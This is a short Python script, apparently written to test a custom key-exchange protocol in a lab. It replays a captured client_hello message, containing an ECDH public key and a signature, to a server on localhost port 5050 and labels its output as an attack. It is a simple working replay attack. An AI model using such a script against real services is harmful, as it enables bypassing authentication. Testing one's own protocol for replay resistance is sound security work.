# replay_attack_clienthello.py
import socket

# Replace this with an actual client_hello captured from Wireshark / logs
CLIENT_HELLO_JSON = b"{\"type\": \"client_hello\", \"device_id\": \"client\", \"ecdh_public_key\": \"t3LzdPBnTxXmY0R1gQycf411dave+MFDOMnxad4GKx8=\", \"signature\": \"SJc1yDIkJcQi+Xg/GPkM/U/d29JKs/V1BL4am1z3MrpC4+SvG/27Jy1o24zGLp7N8ElvaAu/db/4p+X0wArIyLH+C7Gb6/xPIPba4Dz9syNX1xl6beP1xrLiwD3nho22LUvHomDqaVFWxobKGKmGrDrzgL3dnbhI/Dis7EqOb0MgNWRl3AZozk2wSehnfvA/olvz5sAaw7W1htvkdLXs6QY/us5r21HaFgVLVXaoNZ+CGIGzLDDjupCELia94h1xyFoo96GljGJC/wKj6cbETcSeogRQ/JhUWnH6boL5W7oGFvaN9L6ca9Iiu5nBUHbEY47qAVU+YrRc2U/B8M+WnQ==\"}"
def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 5050))
    print("[ATTACK] Connected. Replaying captured client_hello...")

    sock.sendall(CLIENT_HELLO_JSON)
    sock.close()
    print("[ATTACK] Sent & closed.")

if __name__ == "__main__":
    main()
